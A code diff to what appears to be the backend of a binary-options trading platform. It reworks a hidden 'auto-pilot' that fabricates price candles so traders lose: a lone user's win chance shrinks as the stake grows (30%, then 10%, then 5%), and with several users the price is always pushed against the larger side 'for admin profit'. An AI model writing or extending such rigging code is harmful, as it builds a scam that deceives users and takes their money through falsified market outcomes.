@@ -40,6 +40,7 @@ const HISTORY_SEED_COUNT = 100;
 // 🔥 ADMIN HIDDEN AUTO-PILOT SETTINGS 🔥
 const SMART_AUTO_PILOT = true; 
 const ADMIN_WIN_RATIO = 0.80;  // 80% Win Rate for Admin
+const MAX_CANDLES = 350;
 
 const markets = {}; 
 const activeTradesDb = {}; 
@@ -172,22 +173,51 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
             marketData.nextCandleCommand = null;
         } 
         
-        // Priority 2: Smart Auto-Pilot (Hidden from Panel, operates in Backend)
+        // Priority 2: Smart Auto-Pilot (New Logic)
         if (!newCandle && SMART_AUTO_PILOT) {
             const trades = activeTradesDb[marketData.marketId] || {};
-            let upVol = 0, downVol = 0;
-            
-            Object.values(trades).forEach(t => {
-                if (t.direction === 'UP') upVol += t.amount;
-                if (t.direction === 'DOWN') downVol += t.amount;
-            });
+            const tradeValues = Object.values(trades);
+            const uniqueUserIds = new Set(tradeValues.map(t => t.uid));
 
-            if (upVol > 0 || downVol > 0) {
-                if (Math.random() < ADMIN_WIN_RATIO) {
+            if (uniqueUserIds.size === 1) {
+                // --- SINGLE USER LOGIC ---
+                const trade = tradeValues[0];
+                const amount = trade.amount;
+                let userWinChance;
+
+                if (amount <= 10) {
+                    userWinChance = 0.30; // 30% win rate for user
+                } else if (amount > 10 && amount <= 100) {
+                    userWinChance = 0.10; // 10% win rate for user
+                } else { // amount > 100
+                    userWinChance = 0.05; // 5% win rate for user
+                }
+
+                const shouldUserWin = Math.random() < userWinChance;
+                
+                if (!shouldUserWin) { // Force user to lose
+                    const targetDirection = trade.direction === 'UP' ? 'RED' : 'GREEN';
+                    newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
+                    console.log(`[AUTO-PILOT SINGLE] ${marketData.marketId} -> User bet ${amount}. Forcing LOSS with ${targetDirection}. (Win Chance: ${userWinChance*100}%)`);
+                } else { // Let user win
+                    const targetDirection = trade.direction === 'UP' ? 'GREEN' : 'RED';
+                    newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
+                    console.log(`[AUTO-PILOT SINGLE] ${marketData.marketId} -> User bet ${amount}. Allowing WIN with ${targetDirection}. (Win Chance: ${userWinChance*100}%)`);
+                }
+
+            } else if (uniqueUserIds.size > 1) {
+                // --- MULTIPLE USER LOGIC (Volume-based for Admin Profit) ---
+                let upVol = 0, downVol = 0;
+                tradeValues.forEach(t => {
+                    if (t.direction === 'UP') upVol += t.amount;
+                    if (t.direction === 'DOWN') downVol += t.amount;
+                });
+
+                if (upVol > 0 || downVol > 0) {
+                    // Always make the admin win
                     const targetDirection = upVol > downVol ? 'RED' : 'GREEN';
                     newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
-                    newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
-                    console.log(`[AUTO-PILOT] ${marketData.marketId} -> U:${upVol} D:${downVol}. Forcing ${targetDirection}`);
+                    console.log(`[AUTO-PILOT MULTI] ${marketData.marketId} -> U:${upVol} D:${downVol}. Forcing ${targetDirection} for admin profit.`);
                 }
             }
         }
